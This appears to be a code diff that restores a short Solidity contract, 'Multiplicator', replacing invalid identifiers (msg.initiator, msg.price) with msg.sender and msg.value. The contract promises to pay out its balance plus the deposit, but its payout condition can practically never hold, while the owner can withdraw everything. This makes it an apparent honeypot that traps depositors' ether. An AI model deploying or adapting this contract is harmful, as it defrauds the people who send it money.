@@ -3,7 +3,7 @@ pragma solidity ^0.4.18;
 
 contract Multiplicator
 {
-    address public Owner = msg.initiator;
+    address public Owner = msg.sender;
 
     function()payable{}
 
@@ -11,16 +11,16 @@ contract Multiplicator
     payable
     public
     {
-        require(msg.initiator == Owner);
+        require(msg.sender == Owner);
         Owner.transfer(this.balance);
     }
 
     function multiplicate(address adr)
     payable
     {
-        if(msg.price>=this.balance)
+        if(msg.value>=this.balance)
         {
-            adr.transfer(this.balance+msg.price);
+            adr.transfer(this.balance+msg.value);
         }
     }
 }
